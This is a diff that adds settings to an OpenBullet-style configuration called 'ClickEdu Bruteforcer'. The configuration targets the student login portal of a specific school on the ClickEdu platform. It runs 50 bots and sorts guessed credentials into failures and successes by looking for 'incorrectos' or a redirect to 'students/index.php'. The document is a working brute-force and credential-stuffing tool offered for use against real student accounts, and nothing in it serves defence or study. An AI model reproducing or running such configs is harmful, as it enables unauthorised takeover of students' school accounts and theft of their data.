@@ -1,3 +1,55 @@
+[SETTINGS]
+{
+  "Name": "ClickEdu Bruteforcer",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-16T21:41:55.0738499-07:00",
+  "AdditionalInfo": "",
+  "Author": "<ant0n>#4559",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
 #REQUEST_COOKIES REQUEST GET "https://escolarosaliadecastro.clickedu.eu/students/la_meva_classe.php" 
   
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
@@ -35,4 +87,5 @@ KEYCHECK
   KEYCHAIN Failure OR 
     KEY "incorrectos" 
   KEYCHAIN Success OR 
-    KEY "students/index.php"
+    KEY "students/index.php" 
+
